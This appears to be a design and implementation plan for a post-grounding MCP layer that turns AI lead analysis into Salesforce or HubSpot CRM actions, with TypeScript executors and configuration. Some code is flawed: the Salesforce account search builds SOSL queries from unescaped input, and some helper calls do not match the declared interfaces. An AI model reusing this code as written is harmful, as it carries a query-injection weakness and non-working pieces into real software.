# MCP Implementation Plan: Post-Grounding CRM Actions

## Overview

This document outlines the implementation of a Model Context Protocol (MCP) layer that sits **after** LLM response grounding to execute safe, auditable CRM actions. The MCP acts as a controlled bridge between AI decisions and CRM mutations.

### Quick Reference: Local vs Production

| Aspect | Local Development | Production (Salesforce) | Production (HubSpot) |
|--------|-------------------|-------------------------|----------------------|
| **Executor** | `MockMCPExecutor` | `SalesforceMCPExecutor` | `HubSpotMCPExecutor` |
| **Storage** | Postgres (`crm_sync_logs` table) | Salesforce Cloud | HubSpot Cloud |
| **Latency** | Simulated (100-500ms) | Real API (~200-800ms) | Real API (~150-600ms) |
| **Credentials** | None needed | Username + Password + Token | OAuth Access Token |
| **CRM IDs** | Generated (`00Q...`, `003...`) | Real Salesforce IDs | Real HubSpot IDs |
| **Audit Trail** | Local DB table | Salesforce Task/History | HubSpot Engagement |
| **Rollback** | SQL delete | Salesforce recycle bin | HubSpot restore |

**Switching between environments:**
```bash
# Local development
CRM_PROVIDER=MOCK

# Production with Salesforce
CRM_PROVIDER=SALESFORCE
SALESFORCE_USERNAME=api@company.com
SALESFORCE_PASSWORD=***

# Production with HubSpot
CRM_PROVIDER=HUBSPOT
HUBSPOT_ACCESS_TOKEN=pat-na1-***
```

---

## Current Architecture Analysis

The system currently has:
- **AI Service** (`src/ai/ai.service.ts`): Performs lead analysis with grounding validation
- **Lead Processor** (`src/ai/lead.processor.ts`): Processes queued leads, calls AI service, pushes to CRM
- **CRM Provider** (`src/crm/crm-provider.interface.ts`): Simple `pushLead(lead)` interface
- **Grounding System**: Validates AI outputs against enrichment data with strict rules

---

## Proposed MCP Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           LEAD PROCESSOR FLOW                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐  │
│  │   Lead      │───▶│  AI Service │───▶│ Grounding   │───▶│    MCP      │  │
│  │   Data      │    │   (Gemini)  │    │ Validation  │    │   Router    │  │
│  └─────────────┘    └─────────────┘    └─────────────┘    └──────┬──────┘  │
│                                                                    │        │
│                    GROUNDING STATUS = VALID/DOWNGRADED            │        │
│                    (REJECTED = halt, manual review)               │        │
│                                                                   ▼        │
│                                                          ┌─────────────┐   │
│                                                          │ MCP Context │   │
│                                                          │  Builder    │   │
│                                                          └──────┬──────┘   │
│                                                                 │          │
│                                                                 ▼          │
│                          ┌──────────────────────────────────────────────┐  │
│                          │              MCP TOOL REGISTRY                │  │
│                          ├──────────────────────────────────────────────┤  │
│                          │  ┌──────────┐  ┌──────────┐  ┌──────────┐   │  │
│                          │  │  LEAD    │  │  ACCOUNT │  │  SALES   │   │  │
│                          │  │ LIFECYCLE│  │/CONTACT  │  │ WORKFLOW │   │  │
│                          │  └────┬─────┘  └────┬─────┘  └────┬─────┘   │  │
│                          │  ┌──────────┐  ┌──────────┐  ┌──────────┐   │  │
│                          │  │ ACTIVITY │  │ENRICHMENT│  │  (safe)  │   │  │
│                          │  │/VISIBILITY│  │  SYNC    │  │          │   │  │
│                          │  └────┬─────┘  └────┬─────┘  └──────────┘   │  │
│                          └───────┼─────────────┼───────────────────────┘  │
│                                  │             │                          │
│                                  ▼             ▼                          │
│                          ┌──────────────────────────┐                     │
│                          │    CRM EXECUTOR LAYER    │                     │
│                          │  (SalesforceService/     │                     │
│                          │   MockCrmService)         │                     │
│                          └──────────────────────────┘                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1: MCP Core Infrastructure

## Current CRM Setup: Mock (Local) vs Real (Production)

The project already has a **provider pattern** for switching between mock and real CRM implementations:

### Local Development (Mock CRM)

```typescript
// src/crm/crm.service.ts - Mock Implementation
@Injectable()
export class MockCrmService implements CRMProvider {
  constructor(
    @InjectRepository(Lead)
    private readonly leadRepository: Repository<Lead>,
  ) {}

  async pushLead(lead: Lead): Promise<void> {
    this.logger.log(`[MOCK CRM] Pushing lead: ${lead.email}`);
    
    // Simulate API latency
    await new Promise((resolve) => setTimeout(resolve, 500));

    // Store sync state locally in Postgres
    lead.status = 'SYNCED_TO_CRM';
    await this.leadRepository.save(lead);
    
    this.logger.log(`[MOCK CRM] Lead ${lead.email} synced`);
  }
}
```

**How it works locally:**
- Uses local Postgres database to store lead status
- Simulates API latency (500ms delay)
- No external API calls or credentials needed
- Lead status changes: `PENDING` → `ENRICHED` → `SYNCED_TO_CRM`

**Environment Configuration:**
```bash
# .env (local development)
CRM_PROVIDER=MOCK  # or unset - defaults to mock
DATABASE_URL=postgresql://user:pass@localhost:5432/leads_db
```

### Production (Salesforce/HubSpot)

```typescript
// src/crm/salesforce.service.ts - Real Implementation (Skeleton)
@Injectable()
export class SalesforceService implements CRMProvider {
    async pushLead(lead: Lead): Promise<void> {
        // Currently throws NotImplementedException
        // To be implemented for production
    }
}
```

**Provider Switching Logic:**
```typescript
// src/crm/crm.module.ts
{
  provide: 'CRM_PROVIDER',
  useFactory: (configService: ConfigService, mock: MockCrmService, real: SalesforceService) => {
    const provider = configService.get<string>('CRM_PROVIDER');
    return provider === 'REAL' ? real : mock;  // 'REAL' = Salesforce
  },
  inject: [ConfigService, MockCrmService, SalesforceService],
}
```

---

## MCP Executor Pattern for Multi-CRM Support

The MCP layer will extend this pattern with **executors** that map MCP tools to CRM-specific APIs:

```
┌─────────────────────────────────────────────────────────────────────┐
│                     MCP EXECUTOR ARCHITECTURE                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────────┐     ┌─────────────────┐     ┌─────────────────┐   │
│  │   MCP Tool   │────▶│  CRM Executor   │────▶│  External API   │   │
│  │  (Generic)   │     │  (Interface)    │     │  (Salesforce/   │   │
│  │              │     │                 │     │   HubSpot/      │   │
│  └──────────────┘     └────────┬────────┘     │   Mock)         │   │
│                               │              └─────────────────┘   │
│                    ┌──────────┼──────────┐                         │
│                    ▼          ▼          ▼                         │
│           ┌────────────┐ ┌────────┐ ┌──────────┐                  │
│           │  Mock      │ │Sales-  │ │ HubSpot  │                  │
│           │  Executor  │ │force   │ │ Executor │                  │
│           │  (Local)   │ │Executor│ │ (Prod)   │                  │
│           └────────────┘ └────────┘ └──────────┘                  │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

### 1.1 Create MCP Module Structure

```
src/mcp/
├── mcp.module.ts                    # NestJS module definition
├── executors/
│   ├── mcp-executor.interface.ts    # Generic executor contract
│   ├── mock.executor.ts             # Local development (Postgres-based)
│   ├── salesforce.executor.ts       # Production Salesforce API
│   └── hubspot.executor.ts          # Alternative: HubSpot API
├── mcp.service.ts                   # Main MCP orchestrator
├── interfaces/
│   ├── mcp-tool.interface.ts        # Tool contract definition
│   ├── mcp-context.interface.ts     # Context passed to tools
│   └── mcp-executor.interface.ts    # CRM executor contract
├── registry/
│   ├── mcp-registry.service.ts      # Tool registration & discovery
│   └── tool-schemas.ts              # Zod schemas for all tools
├── tools/
│   ├── lead-lifecycle.tools.ts      # create_lead, upsert_lead, etc.
│   ├── account-contact.tools.ts     # match_account, create_contact
│   ├── sales-workflow.tools.ts      # create_opportunity, etc.
│   ├── activity.tools.ts            # create_task, log_activity
│   └── enrichment-sync.tools.ts     # sync_firmographics
├── executors/
│   ├── salesforce.executor.ts       # Real Salesforce implementation
│   └── mock.executor.ts             # Safe mock for testing
└── guards/
    ├── mcp-safety.guard.ts          # Pre-execution safety checks
    └── mcp-audit.service.ts         # Action logging & audit trail
```

### 1.2 Core Interfaces

**`src/mcp/interfaces/mcp-executor.interface.ts`** - CRM-specific implementations:

```typescript
export interface MCPExecutor {
  // Lead Lifecycle
  createLead(params: CreateLeadParams): Promise<CRMResult>;
  upsertLead(params: UpsertLeadParams): Promise<CRMResult>;
  convertLead(params: ConvertLeadParams): Promise<CRMResult>;
  assignOwner(params: AssignOwnerParams): Promise<CRMResult>;
  updateLeadStatus(params: UpdateStatusParams): Promise<CRMResult>;

  // Field Updates
  updateLeadFields(params: UpdateFieldsParams): Promise<CRMResult>;
  setLeadScore(params: SetScoreParams): Promise<CRMResult>;

  // Account/Contact
  matchAccount(params: MatchAccountParams): Promise<CRMResult>;
  createContact(params: CreateContactParams): Promise<CRMResult>;
  linkContactToAccount(params: LinkContactParams): Promise<CRMResult>;

  // Sales Workflow
  createOpportunity(params: CreateOpportunityParams): Promise<CRMResult>;
  updateOpportunityStage(params: UpdateStageParams): Promise<CRMResult>;
  setOpportunityValue(params: SetValueParams): Promise<CRMResult>;
  attachCampaign(params: AttachCampaignParams): Promise<CRMResult>;

  // Activity
  createTask(params: CreateTaskParams): Promise<CRMResult>;
  logActivity(params: LogActivityParams): Promise<CRMResult>;
  addNote(params: AddNoteParams): Promise<CRMResult>;
  createFollowUp(params: CreateFollowUpParams): Promise<CRMResult>;

  // Enrichment
  syncFirmographics(params: SyncFirmographicsParams): Promise<CRMResult>;
}

export interface CRMResult<T = any> {
  success: boolean;
  data?: T;
  error?: string;
  crmRecordId?: string;
  warnings?: string[];
}
```

**`src/mcp/interfaces/mcp-tool.interface.ts`**:

```typescript
export interface MCPTool<TParams = any, TResult = any> {
  name: string;
  description: string;
  category: ToolCategory;
  paramsSchema: z.ZodSchema<TParams>;
  dangerous: boolean;  // Always false for allowed tools
  
  execute(context: MCPContext, params: TParams): Promise<MCPResult<TResult>>;
}

export interface MCPContext {
  leadId: number;
  leadData: Partial<Lead>;
  aiResult: AiAnalysisResult;  // Post-grounding AI decision
  enrichmentData: any;
  executionId: string;  // For audit trail correlation
  timestamp: Date;
}

export interface MCPResult<T> {
  success: boolean;
  data?: T;
  error?: string;
  crmRecordId?: string;  // Salesforce ID, etc.
  warnings?: string[];
}
```

**Tool Categories**:

```typescript
enum ToolCategory {
  LEAD_LIFECYCLE = 'lead_lifecycle',
  FIELD_UPDATES = 'field_updates',
  ACCOUNT_CONTACT = 'account_contact',
  SALES_WORKFLOW = 'sales_workflow',
  ACTIVITY = 'activity',
  ENRICHMENT_SYNC = 'enrichment_sync',
}
```

---

## MCP Executor Implementations

### Local Development: Mock Executor

The **Mock Executor** stores all CRM state locally in Postgres for safe development and testing:

```typescript
// src/mcp/executors/mock.executor.ts

@Injectable()
export class MockMCPExecutor implements MCPExecutor {
  private readonly logger = new Logger(MockMCPExecutor.name);

  constructor(
    @InjectRepository(Lead)
    private readonly leadRepository: Repository<Lead>,
    @InjectRepository(CrmSyncLog)  // New table for audit
    private readonly syncLogRepository: Repository<CrmSyncLog>,
  ) {}

  // ==================== LEAD LIFECYCLE ====================

  async createLead(params: CreateLeadParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] createLead: ${params.email}`);
    
    // Simulate API delay
    await this.delay(300);
    
    // Generate fake Salesforce ID
    const salesforceId = `00Q${Date.now()}${Math.random().toString(36).substr(2, 5)}`;
    
    // Log the action
    await this.logAction('create_lead', params, { salesforceId });
    
    return {
      success: true,
      crmRecordId: salesforceId,
      data: { 
        id: salesforceId,
        email: params.email,
        status: 'Created',
        mock: true,
      },
    };
  }

  async upsertLead(params: UpsertLeadParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] upsertLead: ${params.email}`);
    await this.delay(250);
    
    // Check if exists in our mock "CRM"
    const existing = await this.findLeadByEmail(params.email);
    
    if (existing) {
      // Update
      await this.logAction('update_lead', params, { updated: true });
      return {
        success: true,
        crmRecordId: existing.crmId,
        data: { ...existing, updated: true, mock: true },
      };
    }
    
    // Create new
    return this.createLead(params);
  }

  async convertLead(params: ConvertLeadParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] convertLead: ${params.leadId}`);
    await this.delay(400);
    
    const contactId = `003${Date.now()}${Math.random().toString(36).substr(2, 5)}`;
    const accountId = `001${Date.now()}${Math.random().toString(36).substr(2, 5)}`;
    
    await this.logAction('convert_lead', params, { contactId, accountId });
    
    return {
      success: true,
      crmRecordId: contactId,
      data: {
        contactId,
        accountId,
        converted: true,
        mock: true,
      },
    };
  }

  // ==================== ACCOUNT/CONTACT ====================

  async matchAccount(params: MatchAccountParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] matchAccount: domain=${params.domain}`);
    await this.delay(200);
    
    // Simulate fuzzy matching
    const mockAccounts = [
      { id: '001ABC123', name: 'Acme Corp', domain: 'acme.com' },
      { id: '001XYZ789', name: 'TechStart Inc', domain: 'techstart.io' },
    ];
    
    const match = mockAccounts.find(a => 
      params.domain?.includes(a.domain) || 
      params.companyName?.includes(a.name)
    );
    
    return {
      success: true,
      data: {
        matched: !!match,
        account: match || null,
        confidence: match ? 0.95 : 0,
        mock: true,
      },
    };
  }

  async createContact(params: CreateContactParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] createContact: ${params.email}`);
    await this.delay(300);
    
    const contactId = `003${Date.now()}${Math.random().toString(36).substr(2, 5)}`;
    
    await this.logAction('create_contact', params, { contactId });
    
    return {
      success: true,
      crmRecordId: contactId,
      data: { id: contactId, ...params, mock: true },
    };
  }

  // ==================== SALES WORKFLOW ====================

  async createOpportunity(params: CreateOpportunityParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] createOpportunity: ${params.name}`);
    await this.delay(350);
    
    const oppId = `006${Date.now()}${Math.random().toString(36).substr(2, 5)}`;
    
    await this.logAction('create_opportunity', params, { oppId });
    
    return {
      success: true,
      crmRecordId: oppId,
      data: {
        id: oppId,
        stage: 'Prospecting',
        amount: params.amount || 0,
        mock: true,
      },
    };
  }

  async updateOpportunityStage(params: UpdateStageParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] updateOpportunityStage: ${params.oppId} → ${params.stage}`);
    await this.delay(200);
    
    // Validate stage transitions
    const validStages = ['Prospecting', 'Qualification', 'Needs Analysis', 'Value Proposition', 'Closed Won', 'Closed Lost'];
    
    if (!validStages.includes(params.stage)) {
      return {
        success: false,
        error: `Invalid stage: ${params.stage}. Valid stages: ${validStages.join(', ')}`,
      };
    }
    
    return {
      success: true,
      data: { oppId: params.oppId, newStage: params.stage, mock: true },
    };
  }

  // ==================== ACTIVITY ====================

  async createTask(params: CreateTaskParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] createTask: ${params.subject}`);
    await this.delay(150);
    
    const taskId = `00T${Date.now()}${Math.random().toString(36).substr(2, 5)}`;
    
    await this.logAction('create_task', params, { taskId });
    
    return {
      success: true,
      crmRecordId: taskId,
      data: { id: taskId, status: 'Not Started', mock: true },
    };
  }

  async logActivity(params: LogActivityParams): Promise<CRMResult> {
    this.logger.log(`[MOCK] logActivity: ${params.type}`);
    await this.delay(100);
    
    // Store in local audit table
    await this.syncLogRepository.save({
      action: 'log_activity',
      entityType: params.relatedToType,
      entityId: params.relatedToId,
      details: params.description,
      timestamp: new Date(),
    });
    
    return {
      success: true,
      data: { logged: true, mock: true },
    };
  }

  // ==================== HELPERS ====================

  private async delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  private async logAction(action: string, params: any, result: any): Promise<void> {
    await this.syncLogRepository.save({
      action,
      params: JSON.stringify(params),
      result: JSON.stringify(result),
      timestamp: new Date(),
      mock: true,
    });
  }

  private async findLeadByEmail(email: string): Promise<any> {
    // Query local "CRM" table
    return this.syncLogRepository.findOne({
      where: { action: 'create_lead', 'params.email': email },
    });
  }
}
```

**Local Database Schema (Mock CRM):**
```typescript
// src/mcp/entities/crm-sync-log.entity.ts
@Entity('crm_sync_logs')
export class CrmSyncLog {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  action: string;  // 'create_lead', 'create_opportunity', etc.

  @Column({ nullable: true })
  entityType: string;

  @Column({ nullable: true })
  entityId: string;

  @Column({ type: 'jsonb', nullable: true })
  params: any;

  @Column({ type: 'jsonb', nullable: true })
  result: any;

  @Column({ default: true })
  mock: boolean;

  @Column({ nullable: true })
  mcpExecutionId: string;

  @CreateDateColumn()
  timestamp: Date;
}
```

---

### Production: Salesforce Executor

The **Salesforce Executor** uses the Salesforce REST API with jsforce:

```typescript
// src/mcp/executors/salesforce.executor.ts

@Injectable()
export class SalesforceMCPExecutor implements MCPExecutor {
  private readonly logger = new Logger(SalesforceMCPExecutor.name);
  private conn: jsforce.Connection;

  constructor(private configService: ConfigService) {
    // Initialize connection
    this.conn = new jsforce.Connection({
      loginUrl: this.configService.get('SALESFORCE_LOGIN_URL'),
    });
  }

  async onModuleInit() {
    // Authenticate on startup
    await this.conn.login(
      this.configService.get('SALESFORCE_USERNAME'),
      this.configService.get('SALESFORCE_PASSWORD'),
    );
    this.logger.log('Connected to Salesforce');
  }

  // ==================== LEAD LIFECYCLE ====================

  async createLead(params: CreateLeadParams): Promise<CRMResult> {
    try {
      // Map generic params to Salesforce Lead object
      const salesforceLead = {
        Email: params.email,
        FirstName: params.firstName,
        LastName: params.lastName || 'Unknown',
        Company: params.company || 'Unknown',
        Title: params.title,
        LeadSource: params.source,
        CampaignId: params.campaignId,
        // Custom fields for AI data
        AI_Fit_Score__c: params.aiFitScore,
        AI_Intent__c: params.aiIntent,
        AI_Analysis_ID__c: params.aiAnalysisId,
      };

      const result = await this.conn.sobject('Lead').create(salesforceLead);
      
      if (result.success) {
        return {
          success: true,
          crmRecordId: result.id,
          data: { id: result.id, ...salesforceLead },
        };
      }
      
      return {
        success: false,
        error: result.errors?.join(', ') || 'Unknown error',
      };
    } catch (error) {
      this.logger.error(`Failed to create lead: ${error.message}`);
      throw error;
    }
  }

  async upsertLead(params: UpsertLeadParams): Promise<CRMResult> {
    // Use External ID field for idempotency
    const externalId = generateIdempotencyKey(params.email, params.campaignId);
    
    try {
      const result = await this.conn.sobject('Lead').upsert(
        {
          Email: params.email,
          FirstName: params.firstName,
          LastName: params.lastName,
          // ... other fields
          External_ID__c: externalId,  // Custom external ID field
        },
        'External_ID__c'  // Upsert key
      );
      
      return {
        success: result.success,
        crmRecordId: result.id,
        data: { 
          id: result.id, 
          created: result.created,
          updated: !result.created,
        },
      };
    } catch (error) {
      this.logger.error(`Failed to upsert lead: ${error.message}`);
      throw error;
    }
  }

  async convertLead(params: ConvertLeadParams): Promise<CRMResult> {
    try {
      const result = await this.conn.sobject('Lead').convert({
        leadId: params.leadId,
        convertedStatus: 'Qualified',
        doNotCreateOpportunity: !params.createOpportunity,
        opportunityName: params.opportunityName,
      });

      return {
        success: true,
        crmRecordId: result.contactId,
        data: {
          contactId: result.contactId,
          accountId: result.accountId,
          opportunityId: result.opportunityId,
        },
      };
    } catch (error) {
      this.logger.error(`Failed to convert lead: ${error.message}`);
      throw error;
    }
  }

  // ==================== ACCOUNT/CONTACT ====================

  async matchAccount(params: MatchAccountParams): Promise<CRMResult> {
    // 1. Search by domain (Website field)
    const domainQuery = params.domain 
      ? `FIND {${params.domain}} IN ALL FIELDS RETURNING Account(Id, Name, Website, Industry)`
      : null;

    // 2. Search by company name
    const nameQuery = params.companyName
      ? `FIND {${params.companyName}} IN NAME FIELDS RETURNING Account(Id, Name, Website, Industry)`
      : null;

    let matches: any[] = [];

    if (domainQuery) {
      const domainResults = await this.conn.search(domainQuery);
      matches = [...matches, ...domainResults.searchRecords];
    }

    if (nameQuery) {
      const nameResults = await this.conn.search(nameQuery);
      matches = [...matches, ...nameResults.searchRecords];
    }

    // Deduplicate and score
    const uniqueMatches = this.deduplicateAccounts(matches);
    const scoredMatches = uniqueMatches.map(m => ({
      ...m,
      confidence: this.calculateMatchConfidence(m, params),
    }));

    // Return best match if confidence > threshold
    const bestMatch = scoredMatches.sort((a, b) => b.confidence - a.confidence)[0];
    
    if (bestMatch && bestMatch.confidence > 0.8) {
      return {
        success: true,
        data: {
          matched: true,
          account: bestMatch,
          confidence: bestMatch.confidence,
        },
      };
    }

    return {
      success: true,
      data: { matched: false, candidates: scoredMatches.slice(0, 3) },
    };
  }

  async createContact(params: CreateContactParams): Promise<CRMResult> {
    const contact = {
      Email: params.email,
      FirstName: params.firstName,
      LastName: params.lastName,
      AccountId: params.accountId,
      Title: params.title,
      LeadSource: params.source,
    };

    const result = await this.conn.sobject('Contact').create(contact);
    
    return {
      success: result.success,
      crmRecordId: result.id,
      data: { id: result.id, ...contact },
    };
  }

  // ==================== SALES WORKFLOW ====================

  async createOpportunity(params: CreateOpportunityParams): Promise<CRMResult> {
    const opportunity = {
      Name: params.name,
      AccountId: params.accountId,
      ContactId: params.contactId,
      StageName: params.stage || 'Prospecting',
      Amount: params.amount,
      CloseDate: params.closeDate || this.defaultCloseDate(),
      LeadSource: params.source,
      CampaignId: params.campaignId,
      // Custom fields
      AI_Qualified__c: true,
      AI_Confidence_Score__c: params.aiConfidence,
    };

    const result = await this.conn.sobject('Opportunity').create(opportunity);
    
    return {
      success: result.success,
      crmRecordId: result.id,
      data: { id: result.id, ...opportunity },
    };
  }

  async updateOpportunityStage(params: UpdateStageParams): Promise<CRMResult> {
    // Validate stage exists in Salesforce
    const validStages = await this.getOpportunityStages();
    
    if (!validStages.includes(params.stage)) {
      return {
        success: false,
        error: `Invalid stage: ${params.stage}. Valid: ${validStages.join(', ')}`,
      };
    }

    const result = await this.conn.sobject('Opportunity').update({
      Id: params.oppId,
      StageName: params.stage,
    });

    return {
      success: result.success,
      data: { oppId: params.oppId, newStage: params.stage },
    };
  }

  // ==================== ACTIVITY ====================

  async createTask(params: CreateTaskParams): Promise<CRMResult> {
    const task = {
      Subject: params.subject,
      WhatId: params.relatedToId,  // Opportunity/Account
      WhoId: params.whoId,         // Contact/Lead
      Status: 'Not Started',
      Priority: params.priority || 'Normal',
      ActivityDate: params.dueDate || this.tomorrow(),
      Description: params.description,
    };

    const result = await this.conn.sobject('Task').create(task);
    
    return {
      success: result.success,
      crmRecordId: result.id,
      data: { id: result.id, ...task },
    };
  }

  async logActivity(params: LogActivityParams): Promise<CRMResult> {
    // Create a completed Task as activity log
    const activity = {
      Subject: `AI: ${params.type}`,
      WhatId: params.relatedToId,
      WhoId: params.whoId,
      Status: 'Completed',
      Description: params.description,
      ActivityDate: new Date().toISOString().split('T')[0],
    };

    const result = await this.conn.sobject('Task').create(activity);
    
    return {
      success: result.success,
      data: { logged: true, taskId: result.id },
    };
  }

  // ==================== HELPERS ====================

  private async getOpportunityStages(): Promise<string[]> {
    // Cache this - doesn't change often
    const result = await this.conn.sobject('Opportunity').describe();
    const stageField = result.fields.find(f => f.name === 'StageName');
    return stageField?.picklistValues?.map(v => v.value) || [];
  }

  private defaultCloseDate(): string {
    const date = new Date();
    date.setMonth(date.getMonth() + 3);  // 3 months from now
    return date.toISOString().split('T')[0];
  }

  private tomorrow(): string {
    const date = new Date();
    date.setDate(date.getDate() + 1);
    return date.toISOString().split('T')[0];
  }
}
```

---

### Alternative: HubSpot Executor

For teams using HubSpot instead of Salesforce:

```typescript
// src/mcp/executors/hubspot.executor.ts

@Injectable()
export class HubSpotMCPExecutor implements MCPExecutor {
  private client: hubspot.Client;

  constructor(private configService: ConfigService) {
    this.client = new hubspot.Client({
      accessToken: this.configService.get('HUBSPOT_ACCESS_TOKEN'),
    });
  }

  async createLead(params: CreateLeadParams): Promise<CRMResult> {
    // HubSpot uses "Contacts" for leads
    const contact = await this.client.crm.contacts.basicApi.create({
      properties: {
        email: params.email,
        firstname: params.firstName,
        lastname: params.lastName,
        company: params.company,
        jobtitle: params.title,
        source: params.source,
        ai_fit_score: params.aiFitScore?.toString(),
        ai_intent: params.aiIntent,
      },
    });

    return {
      success: true,
      crmRecordId: contact.id,
      data: { id: contact.id, properties: contact.properties },
    };
  }

  async createOpportunity(params: CreateOpportunityParams): Promise<CRMResult> {
    // HubSpot uses "Deals"
    const deal = await this.client.crm.deals.basicApi.create({
      properties: {
        dealname: params.name,
        amount: params.amount?.toString(),
        pipeline: 'default',
        dealstage: params.stage || 'appointmentscheduled',
        hubspot_owner_id: params.ownerId,
      },
    });

    // Associate deal with contact
    if (params.contactId) {
      await this.client.crm.deals.associationsApi.create(
        deal.id,
        'contacts',
        params.contactId,
        'deal_to_contact'
      );
    }

    return {
      success: true,
      crmRecordId: deal.id,
      data: { id: deal.id, properties: deal.properties },
    };
  }

  // ... other implementations
}
```

---

### Environment Configuration

```bash
# .env.local (Development)
CRM_PROVIDER=MOCK
# No external API credentials needed
```

```bash
# .env.production (Salesforce)
CRM_PROVIDER=SALESFORCE
SALESFORCE_LOGIN_URL=https://login.salesforce.com
SALESFORCE_USERNAME=api@yourcompany.com
SALESFORCE_PASSWORD=yourpassword
SALESFORCE_SECURITY_TOKEN=yourtoken
# Optional: Custom field mappings
SALESFORCE_CUSTOM_FIELD_AI_SCORE=AI_Fit_Score__c
SALESFORCE_CUSTOM_FIELD_AI_INTENT=AI_Intent__c
```

```bash
# .env.production (HubSpot)
CRM_PROVIDER=HUBSPOT
HUBSPOT_ACCESS_TOKEN=pat-na1-...
HUBSPOT_PIPELINE_ID=default
```

---

### Executor Selection in MCP Module

```typescript
// src/mcp/mcp.module.ts

@Module({
  imports: [TypeOrmModule.forFeature([Lead, CrmSyncLog]), ConfigModule],
  providers: [
    // All executors registered
    MockMCPExecutor,
    SalesforceMCPExecutor,
    HubSpotMCPExecutor,
    
    // Dynamic provider based on env
    {
      provide: 'MCP_EXECUTOR',
      useFactory: (
        configService: ConfigService,
        mock: MockMCPExecutor,
        salesforce: SalesforceMCPExecutor,
        hubspot: HubSpotMCPExecutor,
      ) => {
        const provider = configService.get<string>('CRM_PROVIDER') || 'MOCK';
        
        switch (provider.toUpperCase()) {
          case 'SALESFORCE':
            return salesforce;
          case 'HUBSPOT':
            return hubspot;
          case 'MOCK':
          default:
            return mock;
        }
      },
      inject: [
        ConfigService,
        MockMCPExecutor,
        SalesforceMCPExecutor,
        HubSpotMCPExecutor,
      ],
    },
    
    // MCP services
    MCPService,
    MCPRegistryService,
    MCPSafetyGuard,
    MCPAuditService,
  ],
  exports: [MCPService],
})
export class MCPModule {}
```

---

## Phase 2: Tool Implementation by Category

### 2.1 Lead Lifecycle Tools

| Tool | Purpose | Safety Guarantee |
|------|---------|------------------|
| `create_lead` | Create new Lead in CRM | Idempotency key prevents duplicates |
| `upsert_lead` | Update if exists, create if not | Email-based matching, field-level diff |
| `convert_lead` | Convert Lead → Contact/Account | Validates required fields before convert |
| `assign_owner` | Set lead owner (SDR/AE) | Validates owner exists in CRM |
| `update_lead_status` | Update status field | Whitelist of valid status values |

**Implementation Example** (`lead-lifecycle.tools.ts`):

```typescript
export class CreateLeadTool implements MCPTool<CreateLeadParams, LeadResult> {
  name = 'create_lead';
  description = 'Create a new lead in CRM with AI-enriched data';
  category = ToolCategory.LEAD_LIFECYCLE;
  dangerous = false;
  
  paramsSchema = z.object({
    email: z.string().email(),
    firstName: z.string().optional(),
    lastName: z.string().optional(),
    company: z.string().optional(),
    title: z.string().optional(),
    source: z.string(),
    campaignId: z.string().optional(),
    aiFitScore: z.number().min(0).max(100).optional(),
    aiIntent: z.enum(['Low Fit', 'Medium Fit', 'High Fit', 'Manual Review']).optional(),
    customFields: z.record(z.any()).optional(),
  });

  async execute(context: MCPContext, params: CreateLeadParams): Promise<MCPResult<LeadResult>> {
    // Pre-execution: Check idempotency
    const idempotencyKey = generateIdempotencyKey(params.email, params.campaignId);
    
    // Safety: Never create duplicate leads
    const existing = await this.crmExecutor.findLeadByEmail(params.email);
    if (existing) {
      return {
        success: false,
        error: `Lead already exists: ${existing.id}`,
        warnings: ['Use upsert_lead to update existing records'],
      };
    }

    // Execute
    const result = await this.crmExecutor.createLead({
      ...params,
      idempotencyKey,
      aiAnalysisId: context.executionId,
    });

    return {
      success: true,
      data: result,
      crmRecordId: result.salesforceId,
    };
  }
}
```

### 2.2 Field Update Tools

| Tool | Purpose | Grounding Connection |
|------|---------|---------------------|
| `update_lead_fields` | Generic field update | Only updates fields AI provided evidence for |
| `set_lead_score` | Update lead score | Uses AI fitScore post-grounding |
| `set_intent_level` | Set intent classification | Maps AI intent to CRM picklist values |
| `tag_lead` | Add tags/categories | Whitelist of approved tags |

**Grounding Enforcement**:

```typescript
// In update_lead_fields tool
async execute(context: MCPContext, params: UpdateFieldsParams) {
  // Only allow updates for fields AI provided evidence for
  const allowedFields = context.aiResult.evidence
    .filter(e => e.claim_type === 'FIRMOGRAPHIC' || e.claim_type === 'SCORE')
    .map(e => e.field_path.split('.').pop());
  
  const safeUpdates = Object.keys(params.fields)
    .filter(f => allowedFields.includes(f))
    .reduce((acc, f) => ({ ...acc, [f]: params.fields[f] }), {});
  
  if (Object.keys(safeUpdates).length === 0) {
    return {
      success: false,
      error: 'No grounded fields to update. AI must provide evidence for field changes.',
    };
  }
  
  return this.crmExecutor.updateLead(context.leadId, safeUpdates);
}
```

### 2.3 Account/Contact Tools

| Tool | Purpose | Implementation Notes |
|------|---------|---------------------|
| `match_account` | Find existing account by domain/firmographics | Uses enrichment company data |
| `create_contact` | Create contact under matched account | Validates account exists first |
| `link_contact_to_account` | Associate contact with account | Idempotent linking |

**Account Matching Logic**:

```typescript
// Domain extraction + fuzzy matching
async matchAccount(context: MCPContext): Promise<AccountMatchResult> {
  const emailDomain = extractDomain(context.leadData.email);
  const companyName = context.enrichmentData?.company;
  
  // 1. Exact domain match
  let match = await this.crmExecutor.findAccountByDomain(emailDomain);
  
  // 2. Fuzzy company name match
  if (!match && companyName) {
    const candidates = await this.crmExecutor.searchAccountsByName(companyName);
    match = fuzzyMatch(companyName, candidates);
  }
  
  // 3. Create new account if no match (configurable)
  if (!match && params.createIfNotFound) {
    match = await this.createAccountFromEnrichment(context);
  }
  
  return { match, confidence: calculateConfidence(match, context) };
}
```

### 2.4 Sales Workflow Tools

| Tool | Purpose | Safety Guardrails |
|------|---------|-------------------|
| `create_opportunity` | Create opp from qualified lead | Requires HIGH_FIT intent + min score |
| `update_opportunity_stage` | Move opp through pipeline | Whitelist of valid stage transitions |
